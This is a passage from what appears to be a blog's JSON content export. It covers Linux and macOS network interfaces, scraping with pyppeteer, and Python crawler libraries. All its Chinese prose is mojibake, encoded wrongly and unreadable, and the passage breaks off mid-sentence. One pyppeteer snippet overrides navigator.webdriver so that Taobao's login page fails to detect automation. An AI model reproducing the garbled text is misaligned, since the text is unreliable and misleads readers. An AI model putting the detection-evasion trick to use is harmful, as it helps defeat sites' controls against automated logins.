è™šæ‹Ÿç½‘ç»œæ¥å£\n\nè™šæ‹Ÿç½‘ç»œæ¥å£çš„åº”ç”¨èŒƒå›´éå¸¸å¹¿æ³›ã€‚æœ€ç€åçš„å½“å±â€œloâ€äº†ï¼ŒåŸºæœ¬ä¸Šæ¯ä¸ªlinuxç³»ç»Ÿéƒ½æœ‰è¿™ä¸ªæ¥å£ã€‚\n\nè™šæ‹Ÿç½‘ç»œæ¥å£å¹¶ä¸çœŸå®åœ°ä»å¤–ç•Œæ¥æ”¶å’Œå‘é€æ•°æ®åŒ…ï¼Œè€Œæ˜¯åœ¨ç³»ç»Ÿå†…éƒ¨æ¥æ”¶å’Œå‘é€æ•°æ®åŒ…ï¼Œå› æ­¤è™šæ‹Ÿç½‘ç»œæ¥å£ä¸éœ€è¦é©±åŠ¨ç¨‹åºã€‚\n\nè™šæ‹Ÿç½‘ç»œæ¥å£å’ŒçœŸå®å­˜åœ¨çš„ç½‘ç»œæ¥å£åœ¨ä½¿ç”¨ä¸Šæ˜¯ä¸€è‡´çš„ã€‚\n\n##### 1.4 ç½‘ç»œæ¥å£çš„åˆ›å»º\n\nç¡¬ä»¶ç½‘å¡çš„ç½‘ç»œæ¥å£ç”±é©±åŠ¨ç¨‹åºåˆ›å»ºã€‚è€Œè™šæ‹Ÿçš„ç½‘ç»œæ¥å£ç”±ç³»ç»Ÿåˆ›å»ºæˆ–é€šè¿‡åº”ç”¨å±‚ç¨‹åºåˆ›å»ºã€‚\n\né©±åŠ¨ä¸­åˆ›å»ºç½‘ç»œæ¥å£çš„å‡½æ•°æ˜¯ï¼š`register_netdev(struct net_device *)`æˆ–è€…`register_netdevice(struct net_device *)`ã€‚\n\nè¿™ä¸¤ä¸ªå‡½æ•°çš„åŒºåˆ«æ˜¯ï¼šregister_netdev(â€¦)ä¼šè‡ªåŠ¨ç”Ÿæˆä»¥â€ethâ€ä½œä¸ºæ‰“å¤´åç§°çš„æ¥å£ï¼Œè€Œregister_netdevice(â€¦)éœ€è¦æå‰æŒ‡å®šæ¥å£åç§°.äº‹å®ä¸Šï¼Œregister_netdev(â€¦)ä¹Ÿæ˜¯é€šè¿‡è°ƒç”¨register_netdevice(â€¦)å®ç°çš„ã€‚\n\n\n\n### 2. macçš„ç½‘ç»œæ¥å£\n\n- lo0 = loopback > å›ç¯æ¥å£æˆ–è€… æœ¬åœ°ä¸»æœº(localhost)\n- gif0 = Software Network Interface > é€šç”¨ IP-in-IPéš§é“(RFC2893)\n- stf0 = 6to4 tunnel interface > 6to4è¿æ¥(RFC3056)\n- en0 = Ethernet 0 > ä»¥å¤ªç½‘æˆ–802.11æ¥å£\n- fw0 = Firewire > IP over FireWire(IEEE-1394), macOSç‰¹æœ‰\n- en1 = Ethernet 1 > \n- vmnet8 = Virtual Interface > è™šæ‹Ÿç½‘å¡8\n- vmnet1 = Virtual Interface > è™šæ‹Ÿç½‘å¡1\n- p2p Point-to-Point åè®®\n- awdl airdrop peer to peer(ä¸€ç§mesh network), apple airdropè®¾å¤‡ç‰¹æœ‰\n- bridge ç¬¬2å±‚æ¡¥æ¥\n- vlan è™šæ‹Ÿå±€åŸŸç½‘ç»œ\n\nåœ¨iOSè®¾å¤‡(æ”¯æŒcellular)ä¸Šè¿˜èƒ½çœ‹åˆ°\n\n+ pdp_ip èœ‚çªæ•°æ®è¿æ¥\n\né‚£en0 en1 en2 en3 en4 æ€ä¹ˆè¿™ä¹ˆå¤šï¼Ÿï¼Ÿï¼Ÿ è¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š \n\n```bash\nnetworksetup -listallhardwareports\n\nHardware Port: Wi-Fi\nDevice: en0\nEthernet Address: c4:b3:01:bd:ad:1d\n\nHardware Port: Bluetooth PAN\nDevice: en3\nEthernet Address: c4:b3:01:bd:ad:1e\n\nHardware Port: Thunderbolt 1\nDevice: en1\nEthernet Address: 4a:00:07:4d:b2:b0\n\nHardware Port: Thunderbolt 2\nDevice: en2\nEthernet Address: 4a:00:07:4d:b2:b1\n\nHardware Port: Thunderbolt Bridge\nDevice: bridge0\nEthernet Address: 4a:00:07:4d:b2:b0\n```\n\nåŸæ¥æ˜¯Wi-Fiï¼Œè“ç‰™ï¼Œthunderboltâ€¦\n\n\n\n### 3. ifconfig å‘½ä»¤\n\n```bash\n[root@localhost ~]# ifconfig\neth0      Link encap:Ethernet  HWaddr 00:50:56:BF:26:20  \n          inet addr:192.168.120.204  Bcast:192.168.120.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:596390239 (568.7 MiB)  TX bytes:2886956 (2.7 MiB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:68 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:68 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:2856 (2.7 KiB)  TX bytes:2856 (2.7 KiB)\n```\n\nç¬¬ä¸€è¡Œï¼šè¿æ¥ç±»å‹ï¼šEthernetï¼ˆä»¥å¤ªç½‘ï¼‰HWaddrï¼ˆç¡¬ä»¶macåœ°å€ï¼‰\n\nç¬¬äºŒè¡Œï¼šç½‘å¡çš„IPåœ°å€ã€å­ç½‘ã€æ©ç \n\nç¬¬ä¸‰è¡Œï¼šUPï¼ˆä»£è¡¨ç½‘å¡å¼€å¯çŠ¶æ€ï¼‰RUNNINGï¼ˆä»£è¡¨ç½‘å¡çš„ç½‘çº¿è¢«æ¥ä¸Šï¼‰MULTICASTï¼ˆæ”¯æŒç»„æ’­ï¼‰MTU:1500ï¼ˆæœ€å¤§ä¼ è¾“å•å…ƒï¼‰ï¼š1500å­—èŠ‚\n\nç¬¬å››ã€äº”è¡Œï¼šæ¥æ”¶ã€å‘é€æ•°æ®åŒ…æƒ…å†µç»Ÿè®¡\n\nç¬¬ä¸ƒè¡Œï¼šæ¥æ”¶ã€å‘é€æ•°æ®å­—èŠ‚æ•°ç»Ÿè®¡ä¿¡æ¯ã€‚\n\n\n\nå…¶ä»–è¯´æ˜:\n\n+ eth0 è¡¨ç¤ºç¬¬ä¸€å—ç½‘å¡ï¼Œ å…¶ä¸­ HWaddr è¡¨ç¤ºç½‘å¡çš„ç‰©ç†åœ°å€ï¼Œå¯ä»¥çœ‹åˆ°ç›®å‰è¿™ä¸ªç½‘å¡çš„ç‰©ç†åœ°å€(MACåœ°å€ï¼‰æ˜¯ 00:50:56:BF:26:20\n\n+ inet addr ç”¨æ¥è¡¨ç¤ºç½‘å¡çš„IPåœ°å€ï¼Œæ­¤ç½‘å¡çš„ IPåœ°å€æ˜¯ 192.168.120.204ï¼Œå¹¿æ’­åœ°å€ï¼Œ Bcast:192.168.120.255ï¼Œæ©ç åœ°å€Mask:255.255.255.0 \n\n+ lo æ˜¯è¡¨ç¤ºä¸»æœºçš„å›ååœ°å€ï¼Œè¿™ä¸ªä¸€èˆ¬æ˜¯ç”¨æ¥æµ‹è¯•ä¸€ä¸ªç½‘ç»œç¨‹åºï¼Œä½†åˆä¸æƒ³è®©å±€åŸŸç½‘æˆ–å¤–ç½‘çš„ç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹ï¼Œåªèƒ½åœ¨æ­¤å°ä¸»æœºä¸Šè¿è¡Œå’ŒæŸ¥çœ‹æ‰€ç”¨çš„ç½‘ç»œæ¥å£ã€‚æ¯”å¦‚æŠŠ HTTPDæœåŠ¡å™¨çš„æŒ‡å®šåˆ°å›ååœ°å€ï¼Œåœ¨æµè§ˆå™¨è¾“å…¥ 127.0.0.1 å°±èƒ½çœ‹åˆ°ä½ æ‰€æ¶WEBç½‘ç«™äº†ã€‚ä½†åªæ˜¯æ‚¨èƒ½çœ‹å¾—åˆ°ï¼Œå±€åŸŸç½‘çš„å…¶å®ƒä¸»æœºæˆ–ç”¨æˆ·æ— ä»çŸ¥é“ã€‚\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ [Linuxä¸­çš„loå›ç¯æ¥å£è¯¦ç»†ä»‹ç»](https://blog.csdn.net/huguohu2006/article/details/7261106)\n\n+ [ifconfigå‘½ä»¤](http://www.voidcn.com/article/p-ehcsampr-bmr.html)\n\n+ [ifconfig output in Mac OS X?](https://superuser.com/questions/267660/can-someone-please-explain-ifconfig-output-in-mac-os-x)\n","tags":["ç½‘ç»œæ¥å£"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"pythonçˆ¬è™«åˆ©å™¨pyppeteerçš„ä½¿ç”¨","url":"%2Fp%2F6b1ba1b4.html","content":"\n\n\n### 0. å‰è¨€\n\nChrome59(linuxã€macos)ã€ Chrome60(windows)ä¹‹åï¼ŒChromeè‡ªå¸¦[headless(æ— ç•Œé¢)æ¨¡å¼](https://developers.google.com/web/updates/2017/04/headless-chrome)å¾ˆæ–¹ä¾¿åšè‡ªåŠ¨åŒ–æµ‹è¯•æˆ–è€…çˆ¬è™«ã€‚ä½†æ˜¯å¦‚ä½•å’Œheadlessæ¨¡å¼çš„Chromeäº¤äº’åˆ™æ˜¯ä¸€ä¸ªé—®é¢˜ã€‚é€šè¿‡å¯åŠ¨Chromeæ—¶çš„å‘½ä»¤è¡Œå‚æ•°ä»…èƒ½å®ç°ç®€æ˜“çš„å¯åŠ¨æ—¶åˆå§‹åŒ–æ“ä½œã€‚Seleniumã€Webdriverç­‰æ˜¯ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯å¾€å¾€ä¾èµ–ä¼—å¤šï¼Œä¸å¤Ÿæ‰å¹³ã€‚\n\n\n\npuppeteeræ˜¯è°·æ­Œå®˜æ–¹å‡ºå“çš„ä¸€ä¸ªé€šè¿‡DevToolsåè®®æ§åˆ¶headless Chromeçš„Nodeåº“ã€‚å¯ä»¥é€šè¿‡puppeteerçš„æä¾›çš„apiç›´æ¥æ§åˆ¶Chromeæ¨¡æ‹Ÿå¤§éƒ¨åˆ†ç”¨æˆ·æ“ä½œæ¥è¿›è¡ŒUI Testæˆ–è€…ä½œä¸ºçˆ¬è™«è®¿é—®é¡µé¢æ¥æ”¶é›†æ•°æ®ã€‚\n\n\n\npyperteeræ˜¯puppeteerçš„Pythonå®ç°ï¼Œç›¸æ¯”äºseleniumå…·æœ‰å¼‚æ­¥åŠ è½½ã€é€Ÿåº¦å¿«ã€å…·å¤‡æœ‰ç•Œé¢/æ— ç•Œé¢æ¨¡å¼ã€ä¼ªè£…æ€§æ›´å¼ºä¸æ˜“è¢«è¯†åˆ«ä¸ºæœºå™¨äººåŒæ—¶å¯ä»¥ä¼ªè£…æ‰‹æœºå¹³æ¿ç­‰ç»ˆç«¯ï¼›ä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›ç¼ºç‚¹ï¼Œå¦‚æ¥å£ä¸æ˜“ç†è§£ã€è¯­ä¹‰æ™¦æ¶©ï¼›\n\n<!-- more -->\n\n\n\n### 1. pyppeteerä½¿ç”¨\n\n```bash\npip3 install pyppeteer\n```\n\n\n\n\n\n##### 1.1 æ— å¤´æ¨¡å¼\n\n```python\nbrowser = await launch({'headless': False, 'args': ['--no-sandbox']})\n```\n\nheadless=True, ä¸å¼¹å‡ºæµè§ˆå™¨, æµ‹è¯•é˜¶æ®µå¯ä»¥è®¾ç½®ä¸º False è§‚æµ‹\n\n##### 1.2 pageæ–¹æ³•\n\n```bash\npage.click ç‚¹å‡»\npage.type è¾“å…¥\npage.select ä¸‹æ‹‰æ¡†\n\n\npage.click('.rfm input[name=\"cookietime\"]')\n```\n\nå¯¹äº pageæ–¹æ³•å†…çš„é€‰æ‹©å…ƒç´ è¯­æ³•è¯·å‚è€ƒ:  https://www.w3schools.com/cssref/css_selectors.asp\n\n\n\n### 2. pyppeteer  linuxè¿è¡Œé—®é¢˜\n\n##### 2.1 centosæ— æ³•è¿è¡Œpyppeteer\n\n```\nyum -y install libX11 libXcomposite libXcursor libXdamage libXext libXi libXtst cups-libs libXScrnSaver libXrandr alsa-lib pango atk at-spi2-atk gtk3 \n```\n\n\n\n##### 2.2 Bad NaCl helper startup ack\n\n```\nERROR:nacl_fork_delegate_linux.cc(314)] Bad NaCl helper startup ack (0 bytes)\\n\\n(chrome:24935)\n```\n\nä½¿ç”¨æ— å¤´æ¨¡å¼\n\n\n\n##### 2.3 Navigation Timeout Exceeded: 30000 ms exceeded\n\n```\nawait page.goto(\"https://www.baidu.com\", timeout=0)\n```\n\n+ åŠ ä¸Štimeout\n\n+ æ£€æµ‹å°ç¦ ip\n\n\n\n\n\n### 3. pyppeteer é—®é¢˜è§£å†³æ–¹æ¡ˆ\n\n##### 3.1 æŠ“å–js æ¸²æŸ“åçš„æ•°æ®\n\nä½¿ç”¨ requests æ˜¯æ— æ³•æ­£å¸¸æŠ“å–åˆ°ç›¸å…³æ•°æ®çš„ã€‚å› ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºè¿™ä¸ªé¡µé¢æ˜¯ JavaScript æ¸²æŸ“è€Œæˆçš„ï¼Œæˆ‘ä»¬æ‰€çœ‹åˆ°çš„å†…å®¹éƒ½æ˜¯ç½‘é¡µåŠ è½½ååˆæ‰§è¡Œäº† JavaScript ä¹‹åæ‰å‘ˆç°å‡ºæ¥çš„ï¼Œå› æ­¤è¿™äº›æ¡ç›®æ•°æ®å¹¶ä¸å­˜åœ¨äºåŸå§‹ HTML ä»£ç ä¸­ï¼Œè€Œ requests ä»…ä»…æŠ“å–çš„æ˜¯åŸå§‹ HTML ä»£ç ã€‚\n\nå¥½çš„ï¼Œæ‰€ä»¥é‡åˆ°è¿™ç§ç±»å‹çš„ç½‘ç«™æˆ‘ä»¬åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\n\nå…¶å®ç­”æ¡ˆæœ‰å¾ˆå¤šï¼š\n\n- åˆ†æç½‘é¡µæºä»£ç æ•°æ®ï¼Œå¦‚æœæ•°æ®æ˜¯éšè—åœ¨ HTML ä¸­çš„å…¶ä»–åœ°æ–¹ï¼Œä»¥ JavaScript å˜é‡çš„å½¢å¼å­˜åœ¨ï¼Œç›´æ¥æå–å°±å¥½äº†ã€‚\n- åˆ†æ Ajaxï¼Œå¾ˆå¤šæ•°æ®å¯èƒ½æ˜¯ç»è¿‡ Ajax è¯·æ±‚æ—¶å€™è·å–çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ†æå…¶æ¥å£ã€‚\n- æ¨¡æ‹Ÿ JavaScript æ¸²æŸ“è¿‡ç¨‹ï¼Œç›´æ¥æŠ“å–æ¸²æŸ“åçš„ç»“æœã€‚\n\n\n\nè€Œ Pyppeteer å’Œ Selenium å°±æ˜¯ç”¨çš„ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œä¸‹é¢æˆ‘ä»¬å†ç”¨ Pyppeteer æ¥è¯•è¯•ï¼Œå¦‚æœç”¨ Pyppeteer å®ç°å¦‚ä¸Šé¡µé¢çš„æŠ“å–çš„è¯ï¼Œä»£ç å°±å¯ä»¥å†™ä¸ºå¦‚ä¸‹å½¢å¼ï¼š\n\n```python\nimport asyncio\nfrom pyppeteer import launch\nfrom pyquery import PyQuery as pq\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://quotes.toscrape.com/js/')\n    doc = pq(await page.content())\n    print('Quotes:', doc('.quote').length)\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.2 webdriver æ£€æµ‹é—®é¢˜\n\næœ‰äº›ç½‘ç«™è¿˜æ˜¯ä¼šæ£€æµ‹åˆ°æ˜¯ webdriver å§ï¼Œæ¯”å¦‚æ·˜å®æ£€æµ‹åˆ°æ˜¯ webdriver å°±ä¼šç¦æ­¢ç™»å½•äº†\n\nå…¶å®æ·˜å®ä¸»è¦é€šè¿‡ window.navigator.webdriver æ¥å¯¹ webdriver è¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ JavaScript å°†å®ƒè®¾ç½®ä¸º false å³å¯ï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://login.taobao.com/member/login.jhtml?redirectURL=https://www.taobao.com/')\n    await page.evaluate(\n        '''() =>{ Object.defineProperties(navigator,{ webdriver:{ get: () => false } }) }''')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.3 ä¿æŒç”¨æˆ·è®°å½•\n\nå¾ˆå¤šæœ‹å‹åœ¨æ¯æ¬¡å¯åŠ¨ Selenium æˆ– Pyppeteer çš„æ—¶å€™æ€»æ˜¯æ˜¯ä¸€ä¸ªå…¨æ–°çš„æµè§ˆå™¨ï¼Œé‚£å°±æ˜¯æ²¡æœ‰è®¾ç½®ç”¨æˆ·ç›®å½•ï¼Œå¦‚æœè®¾ç½®äº†å®ƒï¼Œæ¯æ¬¡æ‰“å¼€å°±ä¸å†æ˜¯ä¸€ä¸ªå…¨æ–°çš„æµè§ˆå™¨äº†ï¼Œå®ƒå¯ä»¥æ¢å¤ä¹‹å‰çš„å†å²è®°å½•ï¼Œä¹Ÿå¯ä»¥æ¢å¤å¾ˆå¤šç½‘ç«™çš„ç™»å½•ä¿¡æ¯ã€‚é‚£ä¹ˆè¿™ä¸ªæ€ä¹ˆæ¥åšå‘¢ï¼Ÿå¾ˆç®€å•ï¼Œåœ¨å¯åŠ¨çš„æ—¶å€™è®¾ç½® userDataDir å°±å¥½äº†ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, userDataDir='./userdata', args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://www.taobao.com')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/miyakogi/pyppeteer\n+ [Pythonçˆ¬è™«å…¥é—¨æ•™ç¨‹ 24-100 å¾®åŒ»æŒ‚å·ç½‘åŒ»ç”Ÿæ•°æ®æŠ“å–](https://juejin.im/post/5c35944b6fb9a049de6d8dd2)\n+ [Pythonä¸­ä¸seleniumé½åçš„pyppeteeråº“](https://zhuanlan.zhihu.com/p/63634783)\n+ [pyppeteerä½¿ç”¨é‡åˆ°çš„bugåŠè§£å†³æ–¹æ³•](https://www.sanfenzui.com/pyppeteer-bug-collection.html)\n+ https://juejin.im/post/59e5a86c51882578bf185dba","tags":["çˆ¬è™«"],"categories":["python"]},{"title":"pythonçˆ¬è™«åŸºç¡€","url":"%2Fp%2F2412099c.html","content":"\n\n\n# 0. å‰è¨€\n\nç½‘ç»œçˆ¬è™«ï¼ˆåˆè¢«ç§°ä¸ºç½‘é¡µèœ˜è››ï¼Œç½‘ç»œæœºå™¨äººï¼Œåœ¨FOAFç¤¾åŒºä¸­é—´ï¼Œæ›´ç»å¸¸çš„ç§°ä¸ºç½‘é¡µè¿½é€è€…ï¼‰ï¼Œæ˜¯ä¸€ç§æŒ‰ç…§ä¸€å®šçš„è§„åˆ™ï¼Œè‡ªåŠ¨çš„æŠ“å–ä¸‡ç»´ç½‘ä¿¡æ¯çš„ç¨‹åºæˆ–è€…è„šæœ¬ã€‚\n\næˆ‘è®¤ä¸ºä¸€æ¬¡çˆ¬è™«çš„è¿‡ç¨‹, å°±æ˜¯ç½‘ç»œè¯·æ±‚åˆ°æ•°æ®å, å¤„ç†æ•°æ®, ç„¶åå‘é€æ•°æ®çš„è¿‡ç¨‹.\n\n<!-- more -->\n\n# 1. ç½‘ç»œè¯·æ±‚(requests)\n\n pythonç½‘ç»œè¯·æ±‚ä¸»è¦æœ‰ `urllib` å’Œ `requests`  åº“, å¢™è£‚æ¨è`requests`\n\n```python\nimport requests\n\nurl = 'http://www.baidu.com'\nresponse = requests.get(url)\nhtml = response.text\nprint(html)\n\n\nimport requests\n\nurl = \"http://docs.python-requests.org/zh_CN/latest/_static/requests-sidebar.png\"\nresponse = requests.get(url)\nwith open('image.png','wb') as f:\n  f.write(response.content)\n```\n\n\n\n# 2. æ•°æ®æå– (pyquery)\n\nä¸€èˆ¬æˆ‘ä»¬è¯·æ±‚çš„æ•°æ®ä¸»è¦åˆ†ä»¥ä¸‹å‡ ç±»:\n\n+ html, xml\n+ json\n+ å­—ç¬¦ä¸²\n\nå¯¹äº html, xml æˆ‘ä»¬è¦ä½¿ç”¨ç›¸å…³çš„åº“è¿›è¡Œå¤„ç†, jsonç›´æ¥ååºåˆ—åŒ–å¤„ç†, å­—ç¬¦ä¸²å¯èƒ½éœ€è¦å­—ç¬¦ä¸²åŒ¹é… å’Œ æ­£åˆ™è¡¨è¾¾å¼ å¤„ç†\n\n\n\n> å¯¹html/xml å¤„ç†çš„åº“ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§:\n\n### 2.1 beautifulsoup\n\n```bash\npip install beautifulsoup4\n```\n\nbeautiful Soupå°†å¤æ‚HTMLæ–‡æ¡£è½¬æ¢æˆä¸€ä¸ªå¤æ‚çš„æ ‘å½¢ç»“æ„,æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯Pythonå¯¹è±¡\n\n### 2.2 lxml\n\nlxml ä½¿ç”¨çš„æ˜¯ xpath æŠ€æœ¯\n\n```bash\npip install lxml\n```\n\n### 2.3  lxml, beautifulSoup å¯¹æ¯”\n\nBeautifulSoupæ˜¯ä¸€ä¸ªåº“ï¼Œè€ŒXPathæ˜¯ä¸€ç§æŠ€æœ¯ï¼Œpythonä¸­æœ€å¸¸ç”¨çš„XPathåº“æ˜¯lxmlï¼Œå› æ­¤ï¼Œè¿™é‡Œå°±æ‹¿lxmlæ¥å’ŒBeautifulSoupåšæ¯”è¾ƒå§.\n\n+ æ€§èƒ½ lxml >> BeautifulSoup\n\nBeautifulSoupå’Œlxmlçš„åŸç†ä¸ä¸€æ ·ï¼ŒBeautifulSoupæ˜¯åŸºäºDOMçš„ï¼Œä¼šè½½å…¥æ•´ä¸ªæ–‡æ¡£ï¼Œè§£ææ•´ä¸ªDOMæ ‘ï¼Œå› æ­¤æ—¶é—´å’Œå†…å­˜å¼€é”€éƒ½ä¼šå¤§å¾ˆå¤šã€‚è€Œlxmlåªä¼šå±€éƒ¨éå†ï¼Œå¦å¤–lxmlæ˜¯ç”¨cå†™çš„ï¼Œè€ŒBeautifulSoupæ˜¯ç”¨pythonå†™çš„ï¼Œå› æ­¤æ€§èƒ½æ–¹é¢è‡ªç„¶ä¼šå·®å¾ˆå¤šã€‚\n\n+ æ˜“ç”¨æ€§ BeautifulSoup >> lxml\n\nBeautifulSoupç”¨èµ·æ¥æ¯”è¾ƒç®€å•ï¼ŒAPIéå¸¸äººæ€§åŒ–ï¼Œæ”¯æŒcssé€‰æ‹©å™¨ã€‚lxmlçš„XPathå†™èµ·æ¥éº»çƒ¦ï¼Œå¼€å‘æ•ˆç‡ä¸å¦‚BeautifulSoupã€‚\n\n```\ntitle = soup.select('.content div.title h3')\n```\n\nåŒæ ·çš„ä»£ç ç”¨Xpathå†™èµ·æ¥ä¼šå¾ˆéº»çƒ¦\n\n```\ntitle = tree.xpath(\"//*[@class='content']/div[@class='content']/h3\")\n```\n\n### 2.4. pyquery \n\npyquery å¯è®©ä½ ç”¨ jQuery çš„è¯­æ³•æ¥å¯¹ html/xml è¿›è¡Œæ“ä½œã€‚è¿™å’Œ jQuery ååˆ†ç±»ä¼¼ã€‚è¿™ä¸ªåº“ä¸æ˜¯ï¼ˆè‡³å°‘è¿˜ä¸æ˜¯ï¼‰ä¸€ä¸ªå¯ä»¥å’Œ JavaScriptäº¤äº’çš„ä»£ç åº“ï¼Œå®ƒåªæ˜¯éå¸¸åƒ jQuery API è€Œå·²ã€‚\n\n```bash\npip install pyquery\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­:\n\n```python\n    def parse_html(self,content):\n        doc = pq(content)\n        items = doc(\".dt\").items()\n        for item in items:\n            title = item.find(\"center\").text()\n            for i in item.find(\"th\").items():\n                category = i.find(\"a\").eq(0).text()\n                neirong = i.find(\"a\").eq(1).text()\n                url = i.find(\"a\").eq(1).attr('href')\n\n                one_data = {\n                    \"category\": category,\n                    \"context\": neirong,\n                    \"url\": url,\n                }\n                print(one_data)\n```\n\n\n\n# 3. æ— å¤´æµè§ˆå™¨(pyppeteer)\n\nä»¥å‰å†™çˆ¬è™«ï¼Œé‡åˆ°éœ€è¦ç™»å½•çš„é¡µé¢ï¼Œä¸€èˆ¬éƒ½æ˜¯é€šè¿‡chromeçš„æ£€æŸ¥å…ƒç´ ï¼ŒæŸ¥çœ‹ç™»å½•éœ€è¦çš„å‚æ•°å’ŒåŠ å¯†æ–¹æ³•ï¼Œå¦‚æœç½‘ç«™çš„åŠ å¯†éå¸¸å¤æ‚ï¼Œä¾‹å¦‚ç™»å½•qqçš„ï¼Œå°±ä¼šå¾ˆè›‹ç–¼ã€‚\n\nç°åœ¨æœ‰äº†æ— å¤´æµè§ˆå™¨ï¼Œå†ä¹Ÿä¸éœ€è¦è€ƒè™‘ç™»å½•çš„å‚æ•°å’ŒåŠ å¯†äº†ï¼Œç”¨æ— å¤´æµè§ˆå™¨æ‰“å¼€é¡µé¢ï¼Œé€šè¿‡JSæˆ–JQueryè¯­å¥ï¼Œå¡«å…¥è´¦å·å’Œå¯†ç ï¼Œç„¶åç‚¹å‡»ç™»é™†ï¼Œç„¶åæŠŠCookiesä¿å­˜ä¸‹æ¥ï¼Œå°±å¯ä»¥æ¨¡æ‹Ÿç™»é™†äº†ã€‚\n\n\n\n### 3.1 PhantomJS(æš‚åœå¼€å‘)\n\n```\nserWarning: Selenium support for PhantomJS has been deprecated, please use headless versions of Chrome or Firefox instead\n\næ–°ç‰ˆæœ¬çš„Seleniumä¸å†æ”¯æŒPhantomJSäº†ï¼Œè¯·ä½¿ç”¨Chromeæˆ–Firefoxçš„æ— å¤´ç‰ˆæœ¬æ¥æ›¿ä»£ã€‚\n```\n\n\n\nPhantomJSæ˜¯ä¸€ä¸ªæ— ç•Œé¢çš„,å¯è„šæœ¬ç¼–ç¨‹çš„WebKitæµè§ˆå™¨å¼•æ“ã€‚å®ƒåŸç”Ÿæ”¯æŒå¤šç§web æ ‡å‡†ï¼šDOM æ“ä½œï¼ŒCSSé€‰æ‹©å™¨ï¼ŒJSONï¼ŒCanvas ä»¥åŠSVGã€‚å› æ­¤å¯ä»¥æ¯”æµè§ˆå™¨æ›´åŠ å¿«é€Ÿçš„è§£æå¤„ç†jsåŠ è½½ã€‚\n\n\n\næœ‰æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æµè§ˆå™¨å¤„ç†ç½‘é¡µï¼Œä½†å¹¶ä¸éœ€è¦æµè§ˆï¼Œæ¯”å¦‚ç”Ÿæˆç½‘é¡µçš„æˆªå›¾ã€æŠ“å–ç½‘é¡µæ•°æ®ç­‰æ“ä½œã€‚[PhantomJS](http://phantomjs.org/)çš„åŠŸèƒ½ï¼Œå°±æ˜¯æä¾›ä¸€ä¸ªæµè§ˆå™¨ç¯å¢ƒçš„å‘½ä»¤è¡Œæ¥å£ï¼Œä½ å¯ä»¥æŠŠå®ƒçœ‹ä½œä¸€ä¸ªâ€œè™šæ‹Ÿæµè§ˆå™¨â€ï¼Œé™¤äº†ä¸èƒ½æµè§ˆï¼Œå…¶ä»–ä¸æ­£å¸¸æµè§ˆå™¨ä¸€æ ·ã€‚å®ƒçš„å†…æ ¸æ˜¯WebKitå¼•æ“ï¼Œä¸æä¾›å›¾å½¢ç•Œé¢ï¼Œåªèƒ½åœ¨å‘½ä»¤è¡Œä¸‹ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒå®Œæˆä¸€äº›ç‰¹æ®Šçš„ç”¨é€”ã€‚\n\n\n\nä¸‹è½½: https://phantomjs.org/download.html , ç„¶åæŠŠäºŒè¿›åˆ¶æ”¾åˆ°ä¸€ä¸ªç›®å½•ä¸‹, å¢åŠ ä¸ª$PATH æŒ‡å®šå³å¯\n\n```\nphantomjs -v\n```\n\n\n\n### 3.2. selenium\n\nselenium æ˜¯ä»€ä¹ˆï¼Ÿä¸€å¥è¯ï¼Œè‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·ã€‚å®ƒæ”¯æŒå„ç§æµè§ˆå™¨ï¼ŒåŒ…æ‹¬ Chromeï¼ŒSafariï¼ŒFirefox ç­‰ä¸»æµç•Œé¢å¼æµè§ˆå™¨ã€‚æ¢å¥è¯è¯´å« Selenium æ”¯æŒè¿™äº›æµè§ˆå™¨é©±åŠ¨ã€‚è¯è¯´å›æ¥ï¼ŒPhantomJSä¸ä¹Ÿæ˜¯ä¸€ä¸ªæµè§ˆå™¨å—ï¼Œé‚£ä¹ˆ Selenium æ”¯æŒä¸ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œè¿™æ ·äºŒè€…ä¾¿å¯ä»¥å®ç°æ— ç¼å¯¹æ¥äº†ã€‚æœ‰äººé—®ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨æµè§ˆå™¨è€Œç”¨ä¸€ä¸ªæ²¡ç•Œé¢çš„ PhantomJS 